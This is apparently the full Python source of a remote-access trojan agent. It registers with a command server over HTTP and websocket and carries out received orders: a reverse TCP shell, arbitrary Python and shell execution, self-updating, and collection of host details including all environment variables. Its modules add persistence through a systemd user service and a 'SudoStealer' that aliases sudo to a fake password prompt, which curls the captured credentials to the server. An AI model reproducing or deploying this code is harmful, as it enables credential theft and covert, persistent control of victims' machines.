#!/usr/bin/env python3

import os, subprocess, pickle, time, sys, json, traceback, socket, stat, urllib.request, platform, datetime, pty, signal # Stdlib
import asyncio

try:
	from websockets.asyncio.client import connect, ClientConnection
	from websockets.exceptions import ConnectionClosedError
except:
	subprocess.check_call([sys.executable, "-m", "pip", "install", "-U", "websockets"])
	os.execv(sys.executable, [sys.executable] + sys.argv)

script_path = os.path.abspath(__file__)
state_path = script_path + ".pkl"
ws: ClientConnection = None

# --- State ---
state = {
	"uid": None,
	"version": 1,
	"servers": ["127.0.0.1:8000"],
	"persistence": {
		"enabled": False,
	},
	"sudostealer": {
		"enabled": False,
	},
}

current_host = ""

class Specs:
	def get_os_info():
		return platform.uname()._asdict()

	def get_python_info():
		return {
			"version": platform.python_version(),
			"implementation": platform.python_implementation(),
			"compiler": platform.python_compiler(),
			"build": platform.python_build(),
			"executable": sys.executable,
		}

	def get_uptime():
		try:
			with open("/proc/uptime", "r") as f:
				uptime_seconds = float(f.readline().split()[0])
				return str(datetime.timedelta(seconds=int(uptime_seconds)))
		except Exception as e:
			return str(e)

	def get_memory_info():
		meminfo = {}
		try:
			with open("/proc/meminfo", "r") as f:
				for line in f:
					if ":" in line:
						key, value = line.split(":", 1)
						meminfo[key.strip()] = value.strip()
		except Exception as e:
			meminfo["error"] = str(e)
		return meminfo

	def get_cpu_info():
		cpuinfo = {}
		try:
			with open("/proc/cpuinfo", "r") as f:
				for line in f:
					if ":" in line:
						key, value = line.split(":", 1)
						cpuinfo.setdefault(key.strip(), value.strip())
		except Exception as e:
			cpuinfo["error"] = str(e)
		return cpuinfo

	def get_disk_usage():
		try:
			statvfs = os.statvfs('/')
			total = statvfs.f_frsize * statvfs.f_blocks
			free = statvfs.f_frsize * statvfs.f_bfree
			used = total - free
			return {
				"total_gb": round(total / (1024 ** 3), 2),
				"used_gb": round(used / (1024 ** 3), 2),
				"free_gb": round(free / (1024 ** 3), 2),
			}
		except Exception as e:
			return {"error": str(e)}

	def get_ip_address():
		try:
			hostname = socket.gethostname()
			ip_address = socket.gethostbyname(hostname)
			return ip_address
		except Exception as e:
			return str(e)

	def get_logged_in_users():
		try:
			output = subprocess.check_output(['who'], text=True)
			return [line.strip() for line in output.strip().splitlines()]
		except Exception as e:
			return [str(e)]

	def get_env_vars():
		return dict(os.environ)

	def collect_info(detailed: bool):
		o = {}
		o["os"] = Specs.get_os_info()
		o["python"] = Specs.get_python_info()
		o["uptime"] = Specs.get_uptime()
		o["local_ip"] = Specs.get_ip_address()
		if detailed:
			o["memory"] = Specs.get_memory_info()
			o["cpu"] = Specs.get_cpu_info()
			o["disk_usage"] = Specs.get_disk_usage()
			o["logged_in_users"] = Specs.get_logged_in_users()
			o["envars"] = Specs.get_env_vars()
		o["detailed"] = detailed
		return o

class SudoStealer:
	rcs = ["~/.bashrc","~/.zshrc"]
	dialogpath = os.path.abspath(__file__) + ".sudo"
	append = f"\nalias sudo='SUDO_ASKPASS={dialogpath} sudo -A'"
	
	async def enable():	
		DIALOG = """#!/usr/bin/env sh
handler()
{
echo "" 1>&2
exit 130
}
trap handler SIGINT
username=$(whoami)
read -s -p "[sudo] password for $username: " password 1>&2
echo "" 1>&2
# echo "$username:$password" >> ~/passwords.txt
curl --silent --output /dev/null -d "$username:$password" "{}"
echo "$password"
"""
		
		for i in SudoStealer.rcs:
			i = os.path.expanduser(i)
			if os.path.exists(i):
				with open(i, 'r') as f:
					content = f.read()
				if not content.endswith(SudoStealer.append):
					with open(i, 'a') as f:
						f.write(SudoStealer.append)
		
		with open(SudoStealer.dialogpath, 'w') as f:
			f.write(DIALOG.format(f"http://{current_host}/machine/{state['version']}/{state['uid']}/sudostealer/upload"))
		st = os.stat(SudoStealer.dialogpath)
		os.chmod(SudoStealer.dialogpath, st.st_mode | stat.S_IEXEC)
		state["sudostealer"]["enabled"] = True
		await msg({"event":"module_enabled", "name":"sudostealer"})

	def remove_alias():
		for i in SudoStealer.rcs:
			i = os.path.expanduser(i)
			if os.path.exists(i):
				with open(i, 'r') as f:
					content = f.read()
				if content.endswith(SudoStealer.append):
					with open(i, 'w') as f:
						f.write(content.removesuffix(SudoStealer.append))
	async def disable():
		SudoStealer.remove_alias()
		try:
			os.remove(SudoStealer.dialogpath)
		except OSError:
			pass
		state["sudostealer"]["enabled"] = False
		await msg({"event":"module_disabled", "name":"sudostealer"})

class Persistence:
	sysd_dir = os.path.expanduser("~/.config/systemd/user/")
	service_name = f"{state['uid']}.service"
	service_path = os.path.join(sysd_dir, service_name)
	
	async def enable():
		SERVICE_CONFIG = '''
[Unit]
After=network.target

[Service]
ExecStart={}
Restart=always

[Install]
WantedBy=default.target
'''
		os.makedirs(Persistence.sysd_dir, exist_ok=True)
		with open(Persistence.service_path, "w") as f:
			f.write(SERVICE_CONFIG.format(sys.executable + " " + script_path))

		subprocess.run(["systemctl", "--user", "--now", "enable", Persistence.service_name])
		state["persistence"]["enabled"] = True
		await msg({"event":"module_enabled", "name":"persistence"})
		sys.exit()

	async def disable():
		subprocess.run(["systemctl", "--user", "disable", Persistence.service_name])
		os.remove(Persistence.service_path)
		state["persistence"]["enabled"] = False
		await msg({"event":"module_disabled", "name":"persistence"})

class Shell:
	async def shell_handler(websocket):
		loop = asyncio.get_event_loop()

		# Create a pseudo-terminal
		master_fd, slave_fd = pty.openpty()

		# Spawn shell
		process = await asyncio.create_subprocess_exec(
			"/bin/bash",
			stdin=slave_fd,
			stdout=slave_fd,
			stderr=slave_fd,
			preexec_fn=os.setsid  # Start new process group
		)

		# Read from PTY (in executor to avoid blocking)
		async def read_pty():
			try:
				while True:
					data = await loop.run_in_executor(None, os.read, master_fd, 1024)
					if not data:
						break
					await websocket.send(data.decode(errors="ignore"))
			except Exception as e:
				print(f"[PTY read error] {e}")

		# Write to PTY from WebSocket
		async def write_pty():
			try:
				async for message in websocket:
					os.write(master_fd, message.encode())
			except Exception as e:
				print(f"[WS recv error] {e}")

		try:
			await asyncio.gather(read_pty(), write_pty())
		finally:
			process.send_signal(signal.SIGTERM)
			os.close(master_fd)
			os.close(slave_fd)
	
	async def start_shell(tunnel_id):
		async with connect(f"ws://{current_host}/machine/{state['version']}/tunnel/{tunnel_id}") as websocket:
			await Shell.shell_handler(websocket)

def load_state():
	global state
	if os.path.isfile(state_path):
		with open(state_path, "rb") as f:
			state = pickle.load(f)

def save_state():
	with open(state_path, "wb") as f:
		pickle.dump(state,f)

# --- Utility ---
async def log(data: dict=None, tags:list[str]=[]):
	o = {"event":"log", "tags": tags}
	if data != None:
		o["data"] = data
	await ws.send(json.dumps(o))

async def msg(data:dict):
	await ws.send(json.dumps(data))

async def safe_call(callable) -> bool:
	try:
		if asyncio.iscoroutinefunction(callable):
			await callable()
		else:
			callable()
		return True
	except Exception as e:
		traceback.print_exc()
	
	return False

async def main():
	global ws, current_host
	while True:
		time.sleep(1)

		if not state["uid"]:
			for server in state["servers"]:
				try:
					with urllib.request.urlopen(f"http://{server}/machine/{state['version']}/register/") as response:
						if response.code != 200: continue
						state["uid"] = json.loads(response.read().decode())
						save_state()
					break
				except Exception:
					traceback.print_exc()
		
		for server in state["servers"]:
			try:
				async with connect(f"ws://{server}/machine/{state['version']}/ws/{state['uid']}") as websocket:
					current_host = server
					ws = websocket
					print("Joined")
					
					# websocket.send()
					while True:
						try:
							text = await websocket.recv()
							data = json.loads(text)
							if data["event"] == "order":
								for c in data["orders"]:
									try:
										print(c["type"])
										match c["type"]:
											case "tcpshell":
												s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
												s.connect((c["host"],c["port"]))
												subprocess.Popen(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())
											case "python":
												exec(c["code"], globals(), locals())
											case "run":
												subprocess.Popen(c["code"],shell=True)
											case "update":
												with open(script_path, "w") as f:
													f.write(c["code"])
												os.execv(sys.executable, [sys.executable] + sys.argv)
											case "get_specs":
												await msg({
													"event": "specs",
													"data": Specs.collect_info(c["detailed"] if "detailed" in c else False),
													})
											case "enable_module":
												if c["name"] == "persistence": await Persistence.enable()
												elif c["name"] == "sudostealer": await SudoStealer.enable()
											case "disable_module":
												if c["name"] == "persistence": await Persistence.disable()
												elif c["name"] == "sudostealer": await SudoStealer.disable()
											
									except Exception:
										traceback.print_exc()
										await log(data={"event": "exception", "code": traceback.format_exc()}, tags=["fail","order","error"])
									else:
										await log(tags=["succes","order"])
							elif data["event"] == "shell":
								asyncio.create_task(Shell.start_shell(data["tunnel_id"]))
						except ConnectionClosedError:
							break
						except Exception:
							traceback.print_exc()
					break
			except KeyboardInterrupt:
				break
			except Exception:
				traceback.print_exc()

	save_state()

if __name__ == "__main__":
	load_state()
	asyncio.run(main())